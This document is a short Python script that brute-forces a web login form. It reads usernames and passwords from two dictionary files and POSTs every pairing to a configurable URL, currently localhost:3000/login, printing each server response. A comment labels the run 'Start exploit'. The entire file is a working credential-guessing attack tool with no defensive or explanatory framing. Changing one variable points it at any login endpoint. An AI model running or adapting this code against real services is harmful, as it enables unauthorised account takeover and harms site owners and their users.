import requests



dictId = []
dictPw = []


target = "http://localhost:3000/login" # Target POST URL

IDPARAM = "id" # ID parameter | ex) id
PWPARAM = "passwd" # Password parameter | ex) passwd


def readDict():

	global dictId
	global dictPw


	with open('id.txt') as f:

		while True:

			line = f.readline()

			if not line: break

			dictId.append(line.replace("\n", ""))


	with open('password.txt') as f:

		while True:

			line = f.readline()

			if not line: break

			dictPw.append(line.replace("\n", ""))



def breakGate():

             LOGIN_INFO = { IDPARAM : None, PWPARAM : None }

             print('')


             for i in range(len(dictId)):

                     for j in range(len(dictPw)):

                           LOGIN_INFO[IDPARAM] = dictId[i]
                           LOGIN_INFO[PWPARAM] = dictPw[j]


                           res = requests.post(target, data=LOGIN_INFO)

                           print("=================================")
                           print("DICT.ID: "+dictId[i], "\nDICT.PW: "+dictPw[j])
                           print("=================================")
                           print(res.text)
                           print("=================================\n")


if __name__ == '__main__':


   # Read Dictionary files
   readDict()
   
   # Start exploit
   breakGate()

